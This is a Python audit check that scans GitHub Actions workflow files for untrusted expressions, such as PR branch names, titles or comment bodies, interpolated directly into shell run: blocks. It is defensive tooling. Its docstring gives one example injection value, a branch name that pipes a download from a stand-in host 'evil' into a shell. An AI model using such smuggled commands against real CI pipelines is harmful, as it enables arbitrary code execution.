"""PROTECTED CORE (added 2026-07-08, see audit/lessons.md L4). Flags GitHub
Actions untrusted-context expressions interpolated directly into a `run:`
shell block instead of passed through `env:` -- the former is arbitrary code
execution in CI (a PR author names a branch `x$(curl evil|sh)` and it runs
verbatim inside the shell; git ref names permit $, `, ( ) unlike GitHub
logins), the latter is inert data the shell never re-parses.

Found live in .github/workflows/audit-guard.yml's own
`${{ github.head_ref }}` interpolation, which would have let any PR author
defeat the very guard meant to protect data/registers/ and
data/seen-items.json from a hand-edited PR -- see audit/lessons.md L4.

Deliberately regex-based, not a real YAML+shell parser -- narrow and
human-reviewable, the same tradeoff check_enum_constant_freeze.py's page.html
extraction makes (good enough to catch the known-risky pattern, not a
general-purpose static analyzer). A human reviewing a PR that adds a new
workflow step should still eyeball any `${{ }}` usage in `run:` -- this check
is a backstop, not a replacement for that.
"""
import re

from base import finding, could_not_run

CHECK_ID = "workflow_injection"
MODE = "hard"

# GitHub's own documented list of untrusted, attacker-shaped context
# properties (a fork PR's author fully controls these) -- see GitHub's
# "Understanding the risk of script injections" security hardening guide.
# github.event.pull_request.user.login is deliberately NOT here: a GitHub
# login is restricted to [A-Za-z0-9-] and cannot carry shell metacharacters.
UNTRUSTED_PATTERNS = [
    r"github\.head_ref",
    r"github\.event\.pull_request\.title",
    r"github\.event\.pull_request\.body",
    r"github\.event\.pull_request\.head\.ref",
    r"github\.event\.pull_request\.head\.label",
    r"github\.event\.issue\.title",
    r"github\.event\.issue\.body",
    r"github\.event\.comment\.body",
    r"github\.event\.review\.body",
    r"github\.event\.review_comment\.body",
    r"github\.event\.head_commit\.message",
    r"github\.event\.head_commit\.author\.(name|email)",
    r"github\.event\.commits(\[.*?\])?\.(message|author\.(name|email))",
    r"github\.event\.pages\b",
]
_UNTRUSTED_RE = re.compile("|".join(UNTRUSTED_PATTERNS))
_EXPR_RE = re.compile(r"\$\{\{(.*?)\}\}")


def _run_blocks(text):
    """Yield (line_no, block_text) for every `run:` step body in a workflow
    file -- both single-line (`run: cmd`) and block-scalar (`run: |` /
    `run: >`, indented continuation lines) forms. A sibling `env:` key,
    whether before or after `run:` in the step, is never included: it sits
    at the same indentation as `run:`, not deeper, so the block-scalar
    continuation scan stops before it and the single-line form never reaches
    it at all."""
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        line = lines[i]
        m = re.match(r"^(\s*)run:\s*(.*)$", line)
        if not m:
            i += 1
            continue
        indent, rest = len(m.group(1)), m.group(2).strip()
        start = i
        if rest and rest[0] not in ("|", ">"):
            yield start + 1, rest
            i += 1
            continue
        block_lines = []
        i += 1
        while i < len(lines):
            nxt = lines[i]
            if nxt.strip() == "":
                block_lines.append(nxt)
                i += 1
                continue
            nxt_indent = len(nxt) - len(nxt.lstrip(" "))
            if nxt_indent <= indent:
                break
            block_lines.append(nxt)
            i += 1
        yield start + 1, "\n".join(block_lines)


def run(repo_root):
    workflows_dir = repo_root / ".github" / "workflows"
    if not workflows_dir.exists():
        return [could_not_run(CHECK_ID, "no .github/workflows/ directory found")]

    findings = []
    for path in sorted(workflows_dir.glob("*.yml")):
        try:
            text = path.read_text(encoding="utf-8")
        except Exception as exc:
            findings.append(could_not_run(CHECK_ID, f"could not read {path.name}: {exc}"))
            continue
        rel = f".github/workflows/{path.name}"
        for line_no, block in _run_blocks(text):
            for expr_match in _EXPR_RE.finditer(block):
                expr = expr_match.group(1).strip()
                if _UNTRUSTED_RE.search(expr):
                    findings.append(finding(
                        CHECK_ID, "critical",
                        f"untrusted expression interpolated directly into a run: shell block in {rel}",
                        f"{rel}, run: block starting near line {line_no}: found "
                        f"\"${{{{ {expr} }}}}\" used directly in shell text. This is GitHub Actions "
                        "script injection -- an attacker who controls this value (a PR branch name, "
                        "title, body, or commit message) can inject arbitrary shell commands into this "
                        "job. Pass it through env: instead and reference it as a shell variable.",
                        {"file": rel, "expression": expr},
                    ))
    return findings
